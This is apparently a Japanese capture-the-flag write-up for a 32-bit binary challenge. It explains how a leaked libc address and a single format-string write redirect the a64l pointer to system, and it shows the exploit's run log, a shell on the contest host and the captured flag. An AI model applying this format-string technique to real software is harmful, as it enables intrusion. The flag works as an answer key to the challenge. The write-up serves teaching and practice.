# Solution
32ビットプログラム。     
       
最初にlibc内のa64l関数のアドレスが与えられるため、ここからlibc baseを計算可能。          
その後1回だけ32バイト入力可能なfsbを行うことができる。fsb後exitなしの無限ループに入るため、このfsbで攻撃成功させたい。       
        
NO RELROであり、グローバル領域に様々な関数へのポインタが保存されているためここを書き換えることを考える。      
+ 無限ループの中でa64l(ユーザ入力のbuf)という処理があること。
+ a64lのアドレス4バイトのうち、2バイトはsystem関数のアドレスと必ず一致するため、a64l=>system関数に書き換える場合は2バイトのみを書き換えればよいこと。        
以上の2点よりa64lのポインタをsystem関数を指すようにfsbで上書きを行う。     

```
$ python3 exploit.py
[+] Opening connection to challenges.tamuctf.com on port 2783: Done
0xf7d2f000
0xf7d6dc00
0xdc00
17
[*] Switching to interactive mode
)
Enter your name!
Welcome, \x98\xb3\x0
<snip>
$ ls
b64decoder
flag.txt
start.sh
Please enter input to be decoded:
0
$ cat flag.txt
gigem{b1n5h_1n_b45364?}Please enter input to be decoded:
```
